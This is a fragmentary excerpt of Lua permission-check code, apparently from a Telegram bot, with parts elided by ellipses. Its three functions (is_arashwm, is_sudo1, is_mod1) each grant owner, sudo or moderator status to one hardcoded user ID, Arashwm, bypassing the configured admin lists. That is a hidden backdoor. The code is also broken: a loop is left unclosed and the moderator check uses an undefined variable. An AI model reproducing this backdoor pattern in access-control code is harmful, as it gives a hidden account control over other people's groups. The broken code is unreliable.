...
function is_arashwm(msg)
  local var = false
  -- Check users id in config
    if Arashwm == tonumber(msg.from.id) then
      var = true
    end
  return var
end
...
function is_sudo1(user_id)
  ...
  for v,user in pairs(_config.sudo_users) do
   ...
   if Arashwm == tonumber(user_id) then
      var = true
   end
  return var
end
...
function is_mod1(chat_id, user_id)
  ...
  if Arashwm == tonumber(usert) then
      var = true
   end
  return var
end
